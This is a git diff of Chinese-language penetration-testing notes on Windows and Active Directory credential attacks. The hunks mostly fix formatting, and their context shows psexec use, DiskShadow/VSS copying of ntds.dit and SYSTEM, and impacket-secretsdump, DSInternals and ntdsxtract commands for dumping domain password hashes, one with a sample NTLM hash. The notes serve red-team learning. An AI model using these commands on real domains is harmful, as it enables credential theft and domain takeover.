@@ -25,7 +25,7 @@
 * **[认证](#认证)**
     * [本地](#本地)
     * [工作组](#工作组)
-        * [IPC$](#ipc$)
+        * [IPC$](#ipc\$)
         * [PTH](#pth)
         * [PTK](#ptk)
     * [域](#域)
@@ -600,7 +600,7 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
 
 - **PStools**
     ```cmd
-    psexec.exe \\ip –accepteula -u username -p password program.exe
+    psexec.exe \\ip -accepteula -u username -p password program.exe
     ```
 
     ```
@@ -746,6 +746,8 @@ AD 数据库是 Jet 数据库引擎，它使用提供数据存储和索引服务
 
 ntds.dit 文件由三个主表组成：数据表，链接表和SD表。
 
+破解 ntds.dit 需要结合 SYSTEM 文件
+
 **相关文章**
 - [从NTDS.dit获取密码hash的三种方法](https://www.freebuf.com/sectool/176876.html)
 - [导出域密码哈希值的多种方法介绍](https://www.freebuf.com/articles/system/177764.html)
@@ -755,7 +757,7 @@ ntds.dit 文件由三个主表组成：数据表，链接表和SD表。
 
 **mimikatz**
 
-mimikatz 的 NTDS.DIT 攻击操作见 [mimikatz 笔记](../../安全工具/Mimikatz.md#ntdsdit)
+mimikatz 的 DCSync 攻击 NTDS.DIT 操作见 [mimikatz 笔记](../../安全工具/Mimikatz.md#ntdsdit)
 
 #### 使用VSS卷影副本提取ntds.dit
 
@@ -807,7 +809,7 @@ Get-VolumeShadowCopy
 
 **DiskShadow**
 
-DiskShadow是一个 Microsoft 签名二进制文件，用于协助管理员执行与卷影复制服务（VSS）相关的操作。这个二进制文件有两个模式 interactive 和 script ，脚本将包含自动执行 NTDS.DIT 提取过程所需的所有命令。我们可以在脚本文件中添加以下行，以创建新的 volume shadow copy（卷影复制），挂载新驱动，执行复制命令以及删除 volume shadow copy。
+DiskShadow 是一个 Microsoft 签名二进制文件，用于协助管理员执行与卷影复制服务（VSS）相关的操作。这个二进制文件有两个模式 interactive 和 script ，脚本将包含自动执行 NTDS.DIT 提取过程所需的所有命令。我们可以在脚本文件中添加以下行，以创建新的 volume shadow copy（卷影复制），挂载新驱动，执行复制命令以及删除 volume shadow copy。
 ```
 set context persistent nowriters
 add volume c: alias someAlias
@@ -859,20 +861,20 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 
 #### NTDS转储
 
-**Impacket-secretsdump**
+**Impacket**
 
-- https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
+- 工具地址 : [impacket](https://github.com/SecureAuthCorp/impacket)
 
 Impacket 是一组 python 脚本，可用于执行各种任务，包括提取 NTDS 文件的内容。impacket-secretsdump 模块需要我们提供 SYSTEM 和 NTDS 数据库文件。
-```
+```bash
 impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
 
--system：表示系统 hive 文件的路径（SYSTEM）
--ntds：表示 dit 文件的路径（ntds.dit）
+# system：表示系统 hive 文件的路径（SYSTEM）
+# ntds：表示 dit 文件的路径（ntds.dit）
 ```
 
 此外，impacket 可以通过使用计算机帐户及其哈希进行身份验证从 NTDS.DIT 文件远程转储域密码哈希。
-```
+```bash
 impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
 ```
 
@@ -881,7 +883,7 @@ impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e
 - 工具地址 : [MichaelGrafnetter/DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
 
 DSInternals PowerShell 模块提供了构建在框架之上的易于使用的 cmdlet。主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。
-```
+```powershell
 Save-Module DSInternals -Path C:\Windows\System32\WindowsPowershell\v1.0\Modules
 Install-Module DSInternals
 Import-Module DSInternals
@@ -897,11 +899,11 @@ Get-ADDBAccount -All -DBPath 'C:\Users\sanje\Desktop\NTDS\ntds.dit' -Bootkey $ke
 首先我们需要从 NTDS.dit 文件中提取表格，这里我们可以通过 libesedb-tools 中的 esedbexport 来帮我们完成。Libesedb 是一个用于访问可扩展存储引擎（ESE）数据库文件（EDB）格式的库。当前，ESE 数据库格式被应用于许多不同的应用程序上，如 Windows Search，Windows Mail，Exchange，Active Directory（NTDS.dit）等。
 
 安装
-```
+```bash
 get https://github.com/libyal/libesedb/releases/download/20200418/libesedb-experimental-20200418.tar.gz
 tar xf libesedb-experimental-20200418.tar.gz
 cd libesedb-20200418
-apt-get install autoconf automake autopoint libtool pkg-config
+apt-get install -y autoconf automake autopoint libtool pkg-config
 ./configure
 make
 make install
@@ -909,12 +911,12 @@ ldconfig
 ```
 
 利用该工具从 ntds.dit 文件中转储表格
-```
+```bash
 esedbexport -m tables /root/Desktop/NTDS/ntds.dit
 ```
 
 下载 ntdsxtract 提取用户信息和密码哈希值
-```
+```bash
 git clone https://github.com/csababarta/ntdsxtract.git
 cd ntdsxtract
 python setup.py build && python setup.py install
